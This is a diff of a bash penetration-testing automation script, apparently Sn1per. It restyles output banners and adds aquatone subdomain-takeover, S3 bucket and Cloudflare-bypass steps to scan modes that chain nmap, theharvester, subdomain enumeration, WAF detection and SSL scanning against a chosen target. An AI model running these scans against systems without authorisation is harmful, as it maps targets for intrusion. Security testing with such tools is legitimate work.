+        echo -e "${OKGREEN}====================================================================================${RESET}"
+        echo -e "$OKRED RUNNING INURLBR OSINT QUERIES $RESET"
+        echo -e "${OKGREEN}====================================================================================${RESET}"
         php $INURLBR --dork "site:$TARGET" -s inurlbr-$TARGET.txt
         rm -Rf output/ cookie.txt exploits.conf
       fi
     fi
   fi
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED SCAN COMPLETE! $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   exit
 fi
 
@@ -736,43 +812,80 @@ if [ "$MODE" = "stealth" ]; then
   echo -e "$RESET"
   echo -e "$OKORANGE + -- --=[Launching stealth scan: $TARGET $RESET"
   echo -e "$OKGREEN $RESET"
-  echo -e "$OKGREEN + -- ----------------------------=[Running Nslookup]=------------------------ -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNNING NSLOOKUP $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   nslookup $TARGET
   host $TARGET
   if [ $SCAN_TYPE == "DOMAIN" ];
   then
-    echo -e "$OKGREEN + -- ----------------------------=[Gathering Whois Info]=-------------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING WHOIS INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     whois $TARGET
-    echo -e "$OKGREEN + -- ----------------------------=[Gathering OSINT Info]=-------------------- -- +$RESET"
-    theharvester -d $TARGET -l 200 -b all 2> /dev/null
-    metagoofil -d $TARGET -t doc,pdf,xls,csv,txt -l 200 -n 50 -o $LOOT_DIR/osint/ -f $LOOT_DIR/osint/$TARGET.html
-    echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Info]=---------------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING OSINT INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    theharvester -d $TARGET -l 25 -b all 2> /dev/null
+    metagoofil -d $TARGET -t doc,pdf,xls,csv,txt -l 25 -n 25 -o $LOOT_DIR/osint/ -f $LOOT_DIR/osint/$TARGET.html
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING DNS INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     dig -x $TARGET
     dnsenum $TARGET
     mv -f *_ips.txt $LOOT_DIR/domains/ 2>/dev/null
-    echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Subdomains]=---------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING DNS SUBDOMAINS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     python $PLUGINS_DIR/Sublist3r/sublist3r.py -d $TARGET -vvv -o $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
     dos2unix $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
     echo ""
     echo -e "$OKRED ╔═╗╦═╗╔╦╗╔═╗╦ ╦$RESET"
     echo -e "$OKRED ║  ╠╦╝ ║ ╚═╗╠═╣$RESET"
     echo -e "$OKRED ╚═╝╩╚═ ╩o╚═╝╩ ╩$RESET"
-    echo -e "$OKRED + -- ----------------------------=[Gathering Certificate Subdomains]=-------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING CERTIFICATE SUBDOMAINS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKBLUE"
     curl -s https://crt.sh/?q=%25.$TARGET > /tmp/curl.out && cat /tmp/curl.out | grep $TARGET | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u > $LOOT_DIR/domains/domains-$TARGET-crt.txt && cat $LOOT_DIR/domains/domains-$TARGET-crt.txt
-    echo -e "$OKRED [+] Domains saved to: $LOOT_DIR/domains/domains-$TARGET-full.txt"
+    echo ""
+    echo -e "${OKRED}[+] Domains saved to: $LOOT_DIR/domains/domains-$TARGET-full.txt"
     cat $LOOT_DIR/domains/domains-$TARGET-crt.txt > /tmp/curl.out 2> /dev/null
     cat $LOOT_DIR/domains/domains-$TARGET.txt >> /tmp/curl.out 2> /dev/null
     sort -u /tmp/curl.out > $LOOT_DIR/domains/domains-$TARGET-full.txt
     rm -f /tmp/curl.out 2> /dev/null
     echo -e "$RESET"
-    echo -e "$OKGREEN + -- ----------------------------=[Checking for Sub-Domain Hijacking]=------- -- +$RESET"
-    for a in `cat $LOOT_DIR/domains/domains-$TARGET.txt 2> /dev/null`; do dig $a CNAME | egrep -i "wordpress|instapage|heroku|github|bitbucket|squarespace|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign monitor|cargocollective|statuspage|tumblr|amazonaws|hubspot|cloudfront|modulus" 2>/dev/null; done;
-    echo -e "$OKGREEN + -- ----------------------------=[Checking Email Security]=----------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING FOR SUBDOMAIN HIJACKING $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    for a in `cat $LOOT_DIR/domains/domains-$TARGET-full.txt`; do dig $a CNAME | egrep -i "wordpress|instapage|heroku|github|bitbucket|squarespace|fastly|feed|fresh|ghost|helpscout|helpjuice|instapage|pingdom|surveygizmo|teamwork|tictail|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign|monitor|cargocollective|statuspage|tumblr|amazon|hubspot|cloudfront|modulus|unbounce|uservoice|wpengine" 2>/dev/null; done;
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING FOR EMAIL SECURITY $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     python $PLUGINS_DIR/SimpleEmailSpoofer/spoofcheck.py $TARGET 2>/dev/null
+    echo ""
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED STARTING DOMAIN FLYOVER $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    aquatone-discover -d $TARGET -t 100 --wordlist $PLUGINS_DIR/Sublist3r/subdomains.lst
+    aquatone-takeover -d $TARGET -t 100 
+    aquatone-scan -d $TARGET -t 100 -p80,443
+    aquatone-gather -d $TARGET -t 100 
+    mkdir -p $LOOT_DIR/aquatone/ 2> /dev/null
+    cp -Rf ~/aquatone/$TARGET $LOOT_DIR/aquatone/
+    echo ""
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED STARTING PUBLIC S3 BUCKET SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    cd $PLUGINS_DIR/slurp/
+    ./slurp-linux-amd64 domain --domain $TARGET
+    cd $INSTALL_DIR
+    echo ""
   fi
   echo ""
-  echo -e "$OKGREEN + -- ----------------------------=[Running TCP port scan]=------------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNNING TCP PORT SCAN $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -sS -T5 --open -Pn -p $DEFAULT_PORTS $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
   
   port_80=`grep 'portid="80"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
@@ -783,13 +896,27 @@ if [ "$MODE" = "stealth" ]; then
     echo -e "$OKRED + -- --=[Port 80 closed... skipping.$RESET"
   else
     echo -e "$OKORANGE + -- --=[Port 80 opened... running tests...$RESET"
-    echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING FOR WAF $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     wafw00f http://$TARGET
-    echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING HTTP INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     whatweb http://$TARGET
-    echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING HTTP HEADERS AND METHODS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     xsstracer $TARGET 80
-    echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING CLOUDFLARE $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    cd $PLUGINS_DIR/CloudFail/
+    python3 cloudfail.py --target $TARGET
+    cd $INSTALL_DIR
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED SAVING SCREENSHOTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     if [ ${DISTRO} == "blackarch"  ]; then
       /bin/CutyCapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg
     else
@@ -802,20 +929,32 @@ if [ "$MODE" = "stealth" ]; then
     echo -e "$OKRED + -- --=[Port 443 closed... skipping.$RESET"
   else
     echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
-    echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING FOR WAF $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     wafw00f https://$TARGET
-    echo -e "$OKGREEN + -- ----------------------------=[Checking Cloudflare]=--------------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING HTTP INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    whatweb https://$TARGET
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING HTTP HEADERS AND METHODS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    xsstracer $TARGET 443
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING CLOUDFLARE $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     cd $PLUGINS_DIR/CloudFail/
     python3 cloudfail.py --target $TARGET
     cd $INSTALL_DIR
-    echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
-    whatweb https://$TARGET
-    echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
-    xsstracer $TARGET 443
-    echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING SSL/TLS INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET
     sslscan --no-failed $TARGET
-    echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED SAVING SCREENSHOTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     if [ ${DISTRO} == "blackarch"  ]; then
       /bin/CutyCapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg
     else
@@ -823,8 +962,9 @@ if [ "$MODE" = "stealth" ]; then
     fi
     echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/$TARGET-port443.jpg"
   fi
-  
-  echo -e "$OKGREEN + -- ----------------------------=[Done]=------------------------------------ -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED SCAN COMPLETE! $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e ""
   echo -e ""
   echo -e ""
@@ -841,7 +981,6 @@ if [ "$MODE" = "stealth" ]; then
   echo -e ""
   echo -e ""
   rm -f $INSTALL_DIR/.fuse_* 2> /dev/null
-  loot
   exit
 fi
 
@@ -887,7 +1026,9 @@ if [ "$MODE" = "airstrike" ]; then
     echo -e "$OKRED Bomb raid (contributed by Michael aka SNOOPY@DRYCAS.CLUB.CC.CMU.EDU)"
     echo -e "$RESET"
     echo -e "$OKORANGE + -- --=[Launching airstrike: $a $RESET"
-    echo -e "$OKGREEN + -- ----------------------------=[Running Nslookup]=------------------------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NSLOOKUP $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     nslookup $a
     host $a
     
@@ -900,40 +1041,71 @@ if [ "$MODE" = "airstrike" ]; then
     
     if [ $SCAN_TYPE == "DOMAIN" ];
     then
-      echo -e "$OKGREEN + -- ----------------------------=[Gathering Whois Info]=-------------------- -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED GATHERING WHOIS INFO $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       whois $a
-      echo -e "$OKGREEN + -- ----------------------------=[Gathering OSINT Info]=-------------------- -- +$RESET"
-      theharvester -d $a -l 200 -b all 2> /dev/null
-      metagoofil -d $a -t doc,pdf,xls,csv,txt -l 200 -n 50 -o $LOOT_DIR/osint/ -f $LOOT_DIR/osint/$a.html
-      echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Info]=---------------------- -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED GATHERING OSINT INFO $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      theharvester -d $a -l 25 -b all 2> /dev/null
+      metagoofil -d $a -t doc,pdf,xls,csv,txt -l 25 -n 25 -o $LOOT_DIR/osint/ -f $LOOT_DIR/osint/$a.html
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED GATHERING DNS INFO $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       dig -x $a
       dnsenum $a
       mv -f *_ips.txt $LOOT_DIR/domains/ 2>/dev/null
-      echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Subdomains]=---------------- -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED GATHERING DNS SUBDOMAINS $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       python $PLUGINS_DIR/Sublist3r/sublist3r.py -d $a -vvv -o $LOOT_DIR/domains/domains-$a.txt 2>/dev/null
       dos2unix $LOOT_DIR/domains/domains-$a.txt 2>/dev/null
       echo ""
       echo -e "$OKRED ╔═╗╦═╗╔╦╗╔═╗╦ ╦$RESET"
       echo -e "$OKRED ║  ╠╦╝ ║ ╚═╗╠═╣$RESET"
       echo -e "$OKRED ╚═╝╩╚═ ╩o╚═╝╩ ╩$RESET"
-      echo -e "$OKRED + -- ----------------------------=[Gathering Certificate Subdomains]=-------- -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED GATHERING CERTIFICATE SUBDOMAINS $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKBLUE"
       curl -s https://crt.sh/?q=%25.$a > /tmp/curl.out && cat /tmp/curl.out | grep $a | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u > $LOOT_DIR/domains/domains-$a-crt.txt && cat $LOOT_DIR/domains/domains-$a-crt.txt
-      echo -e "$OKRED [+] Domains saved to: $LOOT_DIR/domains/domains-$a-full.txt"
+      echo ""
+      echo -e "${OKRED}[+] Domains saved to: $LOOT_DIR/domains/domains-$a-full.txt"
       cat $LOOT_DIR/domains/domains-$a-crt.txt > /tmp/curl.out 2> /dev/null
       cat $LOOT_DIR/domains/domains-$a.txt >> /tmp/curl.out 2> /dev/null
       sort -u /tmp/curl.out > $LOOT_DIR/domains/domains-$a-full.txt
       rm -f /tmp/curl.out 2> /dev/null
       echo -e "$RESET"
-      echo -e "$OKGREEN + -- ----------------------------=[Checking for Sub-Domain Hijacking]=------- -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED CHECKING FOR SUB-DOMAIN HIJACKING $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       for b in `cat $LOOT_DIR/domains/domains-$a.txt 2> /dev/null`; do dig $b CNAME | egrep -i 'wordpress|instapage|heroku|github|bitbucket|squarespace|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign monitor|cargocollective|statuspage|tumblr|amazonaws|hubspot|cloudfront|modulus' 2>/dev/null; done;
-      echo -e "$OKGREEN + -- ----------------------------=[Checking Email Security]=----------------- -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED CHECKING EMAIL SECURITY $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       python $PLUGINS_DIR/SimpleEmailSpoofer/spoofcheck.py $a 2>/dev/null
+      echo ""
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED STARTING DOMAIN FLYOVER $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      aquatone-discover -d $a -t 100 --wordlist $PLUGINS_DIR/Sublist3r/subdomains.lst
+      aquatone-takeover -d $a -t 100 
+      aquatone-scan -d $a -t 100 -p80,443
+      aquatone-gather -d $a -t 100 
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED STARTING PUBLIC S3 BUCKET SCAN $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      cd $PLUGINS_DIR/slurp/
+      ./slurp-linux-amd64 domain --domain $TARGET
+      cd $INSTALL_DIR
+      echo ""
     fi
     echo ""
-    echo -e "$OKGREEN + -- ----------------------------=[Running port scan]=------------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING PORT SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     nmap -sS -T5 --open -Pn -p $DEFAULT_PORTS $a -oX $LOOT_DIR/nmap/nmap-$a.xml
-    
     port_80=`grep 'portid="80"' $LOOT_DIR/nmap/nmap-$a.xml | grep open`
     port_443=`grep 'portid="443"' $LOOT_DIR/nmap/nmap-$a.xml | grep open`
     
@@ -942,13 +1114,21 @@ if [ "$MODE" = "airstrike" ]; then
       echo -e "$OKRED + -- --=[Port 80 closed... skipping.$RESET"
     else
       echo -e "$OKORANGE + -- --=[Port 80 opened... running tests...$RESET"
-      echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED CHECKING FOR WAF $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       wafw00f http://$a
-      echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED GATHERING HTTP INFO $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       whatweb http://$a
-      echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED CHECKING HTTP HEADERS AND METHODS $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       xsstracer $a 80
-      echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED SAVING WEB SCREENSHOTS $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       if [ ${DISTRO} == "blackarch"  ]; then
         /bin/CutyCapt --url=http://$a --out=$LOOT_DIR/screenshots/$a-port80.jpg
       else
@@ -961,20 +1141,26 @@ if [ "$MODE" = "airstrike" ]; then
       echo -e "$OKRED + -- --=[Port 443 closed... skipping.$RESET"
     else
       echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
-      echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED CHECKING FOR WAF $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       wafw00f https://$a
-      echo -e "$OKGREEN + -- ----------------------------=[Checking Cloudflare]=--------------------- -- +$RESET"
-      cd $PLUGINS_DIR/CloudFail/
-      python3 cloudfail.py --target $TARGET
-      cd $INSTALL_DIR
-      echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED GATHERING HTTP INFO $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       whatweb https://$a
-      echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED CHECKING HTTP HEADERS AND METHODS $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       xsstracer $a 443
-      echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED GATHERING SSL/TLS INFO $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $a
       sslscan --no-failed $a
-      echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED SAVING WEB SCREENSHOTS $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       if [ ${DISTRO} == "blackarch"  ]; then
         /bin/CutyCapt --url=https://$a --out=$LOOT_DIR/screenshots/$a-port443.jpg
       else
@@ -982,8 +1168,9 @@ if [ "$MODE" = "airstrike" ]; then
       fi
       echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$a-port443.jpg"
     fi
-    
-    echo -e "$OKGREEN + -- ----------------------------=[Done!]=----------------------------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED SCAN COMPLETE! $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e ""
     echo -e ""
     echo -e ""
@@ -1000,7 +1187,6 @@ if [ "$MODE" = "airstrike" ]; then
     echo -e ""
     echo -e ""
   done;
-  loot
   exit
 fi
 
@@ -1047,7 +1233,6 @@ fi
 if [ "$MODE" = "nuke" ]; then
   if [ "$OPT1" = "report" ]; then
     sniper $(realpath $TARGET) $MODE | tee $LOOT_DIR/sniper-$(basename $TARGET)-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
-    loot
     exit
   fi
   for a in `cat $(realpath $TARGET)`; do
@@ -1083,7 +1268,6 @@ if [ "$MODE" = "nuke" ]; then
     echo -e ""
     echo -e ""
   done
-  loot
   stop services
   exit
 fi
@@ -1098,55 +1282,98 @@ echo -e "$RESET"
 echo -e "$OKORANGE + -- --=[http://crowdshield.com"
 echo -e "$OKORANGE + -- --=[sniper v$VER by 1N3"
 echo -e "$RESET"
-echo -e "$OKGREEN + -- ----------------------------=[Running Nslookup]=------------------------ -- +$RESET"
-nslookup $TARGET
-host $TARGET
-echo -e "$OKGREEN + -- ----------------------------=[Checking OS Fingerprint]=----------------- -- +$RESET"
-xprobe2 $TARGET
-if [ $SCAN_TYPE == "DOMAIN" ];
-then
-  echo -e "$OKGREEN + -- ----------------------------=[Gathering Whois Info]=-------------------- -- +$RESET"
-  whois $TARGET
-  echo -e "$OKGREEN + -- ----------------------------=[Gathering OSINT Info]=-------------------- -- +$RESET"
-  theharvester -d $TARGET -l 200 -b all 2> /dev/null
-  metagoofil -d $TARGET -t doc,pdf,xls,csv,txt -l 200 -n 50 -o $LOOT_DIR/osint/ -f $LOOT_DIR/osint/$TARGET.html
-  echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Info]=---------------------- -- +$RESET"
-  dig -x $TARGET
-  dnsenum $TARGET
-  mv -f *_ips.txt $LOOT_DIR/domains/ 2>/dev/null
-  echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Subdomains]=---------------- -- +$RESET"
-  python $PLUGINS_DIR/Sublist3r/sublist3r.py -d $TARGET -vvv -o $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
-  dos2unix $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
-  echo ""
-  echo -e "$OKRED ╔═╗╦═╗╔╦╗╔═╗╦ ╦$RESET"
-  echo -e "$OKRED ║  ╠╦╝ ║ ╚═╗╠═╣$RESET"
-  echo -e "$OKRED ╚═╝╩╚═ ╩o╚═╝╩ ╩$RESET"
-  echo -e "$OKRED + -- ----------------------------=[Gathering Certificate Subdomains]=-------- -- +$RESET"
-  echo -e "$OKBLUE"
-  curl -s https://crt.sh/?q=%25.$TARGET > /tmp/curl.out && cat /tmp/curl.out | grep $TARGET | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u > $LOOT_DIR/domains/domains-$TARGET-crt.txt && cat $LOOT_DIR/domains/domains-$TARGET-crt.txt
-  echo -e "$OKRED [+] Domains saved to: $LOOT_DIR/domains/domains-$TARGET-full.txt"
-  cat $LOOT_DIR/domains/domains-$TARGET-crt.txt > /tmp/curl.out 2> /dev/null
-  cat $LOOT_DIR/domains/domains-$TARGET.txt >> /tmp/curl.out 2> /dev/null
-  sort -u /tmp/curl.out > $LOOT_DIR/domains/domains-$TARGET-full.txt
-  rm -f /tmp/curl.out 2> /dev/null
-  echo -e "$RESET"
-  echo -e "$OKGREEN + -- ----------------------------=[Checking for Sub-Domain Hijacking]=------- -- +$RESET"
-  for a in `cat $LOOT_DIR/domains/domains-$TARGET.txt 2> /dev/null`; do dig $a CNAME | egrep -i 'wordpress|instapage|heroku|github|bitbucket|squarespace|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign monitor|cargocollective|statuspage|tumblr|amazonaws|hubspot|cloudfront|modulus' 2>/dev/null; done;
-  echo -e "$OKGREEN + -- ----------------------------=[Checking Email Security]=----------------- -- +$RESET"
-  python $PLUGINS_DIR/SimpleEmailSpoofer/spoofcheck.py $TARGET 2>/dev/null
+
+if [ "$OSINT" = "1" ]; then
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNNING NSLOOKUP $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  nslookup $TARGET
+  host $TARGET
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED CHECKING OS FINGERPRINT $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  xprobe2 $TARGET
+  if [ $SCAN_TYPE == "DOMAIN" ];
+  then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING WHOIS INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    whois $TARGET
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING OSINT INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    theharvester -d $TARGET -l 25 -b all 2> /dev/null
+    metagoofil -d $TARGET -t doc,pdf,xls,csv,txt -l 25 -n 25 -o $LOOT_DIR/osint/ -f $LOOT_DIR/osint/$TARGET.html
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING DNS INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    dig -x $TARGET
+    dnsenum $TARGET
+    mv -f *_ips.txt $LOOT_DIR/domains/ 2>/dev/null
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING DNS SUBDOMAINS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    python $PLUGINS_DIR/Sublist3r/sublist3r.py -d $TARGET -vvv -o $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
+    dos2unix $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
+    echo ""
+    echo -e "$OKRED ╔═╗╦═╗╔╦╗╔═╗╦ ╦$RESET"
+    echo -e "$OKRED ║  ╠╦╝ ║ ╚═╗╠═╣$RESET"
+    echo -e "$OKRED ╚═╝╩╚═ ╩o╚═╝╩ ╩$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING CERTIFICATE SUBDOMAINS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKBLUE"
+    curl -s https://crt.sh/?q=%25.$TARGET > /tmp/curl.out && cat /tmp/curl.out | grep $TARGET | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u > $LOOT_DIR/domains/domains-$TARGET-crt.txt && cat $LOOT_DIR/domains/domains-$TARGET-crt.txt
+    echo ""
